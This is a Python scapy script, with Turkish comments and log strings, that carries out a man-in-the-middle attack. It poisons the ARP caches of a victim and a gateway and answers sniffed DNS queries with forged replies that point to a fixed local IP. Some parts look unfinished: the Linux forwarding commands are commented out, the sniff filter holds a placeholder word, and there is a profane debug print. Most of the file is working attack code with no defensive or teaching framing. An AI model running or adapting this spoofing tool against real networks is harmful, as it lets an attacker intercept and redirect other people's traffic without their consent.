from scapy.all import *
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP, Ether
from interface.constants import *
from time import sleep
import sys
import os
import platform


def dnspaket(paket):
    if paket.haslayer(DNS) and paket.getlayer(DNS).qr == 0:
        log(paket.show())
        log(paket.haslayer(DNSRR))
        ip = paket.getlayer(IP)
        sorgu = paket.getlayer(DNS)
        kaynakip = paket[IP].src
        hedefip = paket[IP].dst
        kaynakport = paket[UDP].sport
        hedefport = paket[UDP].dport
        sorguadi = sorgu.qd.qname
        cevap = IP(dst=kaynakip, src=hedefip) / UDP(dport=ip.sport, sport=ip.dport) / DNS(id=sorgu.id, qr=1,
                                                                                          qd=sorgu.qd,
                                                                                          an=DNSRR(rrname=sorguadi,
                                                                                                   ttl=10,
                                                                                                   rdata="172.16.103"
                                                                                                         ".249"))
        log(sorguadi)
        log(cevap)
        send(cevap)

def port_forwarding(flag=1):
    """
    require security privilege (sudoer)
    :arg flag: 1 - enable port forwarding
               0 - disable port forwarding
    """
    flag = str(flag)
    if platform.system() == LINUX:
        # case we deal with linux os
        log('echo 1 ip_forward öncesi')
        # os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
        # os.system('echo ' + flag + ' | sudo tee /proc/sys/net/ipv4/ip_forward')
        log('echo 1 ip_forward sonrası')
    elif platform.system() == OSX:
        # case we deal with OSX - Darwin
        os.system('sysctl -w net.inet.ip.forwarding=' + flag)
    else:
        log('Could not use port forwarding, you may want to try enable it manually...')


def get_mac(ip, interface):
    """
    Retrieve mac address of given ip address within a given interface 
    :param ip: ip address
    :param interface: interface 
    :return:  mac address (Ether.src) field of the packet
    """
    conf.verb = 0
    ans, unans = srp(Ether(dst=MAC_ADDRESS_CLEAN_PATTERN) / ARP(pdst=ip), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def done(ip, r, interface):
    """
    restoring the session between the targets
    :param ip: target ip 
    :param r: router ip
    :param interface: interface to operate
    """
    log('Restoring Targets...')
    victim_mac = get_mac(ip, interface)
    gate_mac = get_mac(r, interface)
    send(ARP(op=2, pdst=r, psrc=ip, hwdst=MAC_ADDRESS_CLEAN_PATTERN, hwsrc=victim_mac), count=7)
    send(ARP(op=2, pdst=ip, psrc=r, hwdst=MAC_ADDRESS_CLEAN_PATTERN, hwsrc=gate_mac), count=7)
    log('Disabling IP Forwarding...')
    port_forwarding(0)
    log('Shutting Down...')
    sys.exit(1)


def arp_poison(vm, gm, ip, r, interface, cerr=0):
    """
    do arp poison, if libnet not up yet give up to 10 retries
    to let it up
    :param vm: victim mac address
    :param gm: router mac address
    :param ip: victim ip address
    :param r:  router ip address 
    :param interface: interface to operate on
    :param cerr: optional in case of error (not required by the user)
    :return: None
    """
    try:
        send(ARP(op=2, pdst=ip, psrc=r, hwdst=vm))
        send(ARP(op=2, pdst=r, psrc=ip, hwdst=gm))
    except AttributeError:
        if cerr == 10:
            log('too much errors handled while waiting libnet, sorry, quiting')
            port_forwarding(0)
            exit(0)
        cerr += 1
        # recall with error argument
        # this may be required while netlib sometimes loaded after scapy
        # while scapy using it as a dependency we get an error
        # this recursion prevent error situation
        arp_poison(gm, vm, ip, r, interface, cerr)


def mitm(ip, r, interface):
    """
    Executing the man in the middle attack
    :param ip: target ip address
    :param r: router ip address
    :param interface: interface to operate on
    """
    step = 0
    err_map = {0: '[!] Error could not find victim mac address, force quit!',
               1: '[!] Error could not find getway mac address, force quit!'}
    try:
        port_forwarding(1)
        victim_mac = get_mac(ip, interface)
        print("Victim MAC: " + victim_mac)
        step = 1
        gate_mac = get_mac(r, interface)
        print("Gate MAC: " + gate_mac)
        step = 2
    except Exception as e:
        port_forwarding(0)
        log(err_map[step])  # print error by the error dictionary
        log("[!] Exiting...")
        sys.exit(1)

    log("Poisoning Target ...")
    while 1:
        try:
            log('DNS Paket Sniff')
            sniff(iface="wlp0s20f3", count=1, filter="udp port 53 DEĞİŞECEK", prn=dnspaket)
            arp_poison(victim_mac, gate_mac, ip, r, interface)
            print("OROSPU COCUGU NE ISIN VAR")
            sleep(1.5)
        except KeyboardInterrupt:
            done(ip, r, interface)
            break


def log(msg):
    """
    logging a message with signature
    :param msg: msg represented as a string
    """
    print(SIGNATURE + msg)
